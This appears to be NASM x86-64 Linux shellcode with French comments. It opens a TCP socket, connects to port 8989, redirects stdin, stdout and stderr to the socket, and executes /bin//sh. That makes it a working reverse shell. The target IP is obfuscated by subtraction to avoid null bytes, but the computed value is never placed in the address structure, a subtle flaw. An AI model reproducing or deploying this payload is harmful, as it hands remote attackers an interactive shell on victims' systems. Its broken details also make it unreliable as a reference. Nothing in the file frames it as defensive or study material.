BITS 64
section .text
global _start
_start:
 
; Registre nettoyé
xor rax, rax
xor rbx, rbx
xor rcx, rcx
xor rdi, rdi
xor rsi, rsi
xor rdx, rdx
 
; SOCKET 
mov al, 0x29                ; 0x29 = 41 base 10, sys_socket
mov bl, 0x02                ; 2 à destination finale de RDI, pour AF_INTET (ipv4)
mov rdi, rbx
mov bl, 0x01               ; 1 à destination finale de RSI, pour SOCK_STREAM (TCP)
mov rsi, rbx
syscall
 
; le syscall SOCKET retourne un file descriptor sans RAX. 
; CONNECT 

; recup FD
mov rdi, rax
mov r15, rax
 
xor rax, rax
mov al, 0x2A                ; syscall connect
 
 
xor rbx, rbx
push rbx

; IP
mov esi, 0x020ffff80 
sub esi, 0x010ffff01
 
 
push word 7459              ; hexadécimal pour le port 8989
push word 2                 ; AF_INET
mov rsi, rsp
mov dl, 24
syscall

; STDIN
xor rax, rax
xor rdx, rdx
mov al, 33
mov rdi, r15
xor rsi, rsi
syscall                     ; 

; STDOUT
xor rax, rax
xor rdx, rdx
mov al, 33
mov rdi, r15
inc rsi
syscall                      

; STDERR
xor rax, rax
xor rdx, rdx
mov al, 33                  ; syscall dup2
mov rdi, r15                ; socket.fd
inc rsi                     
syscall                      
 
; int execve(const char *filename, char *const argv [], char *const envp[]);

xor rax, rax
xor rdx, rdx
mov rbx, 0x68732f6e69622f2f ; /hs/nib//
push rax 
push rbx
mov rdi, rsp
push rax
push rdi
mov rsi, rsp
mov al, 0x3b                ; num syscall de execve
syscall
 
xor rdi, rdi
xor rax, rax
mov al,  0x3c               ; syscall de exit
syscall
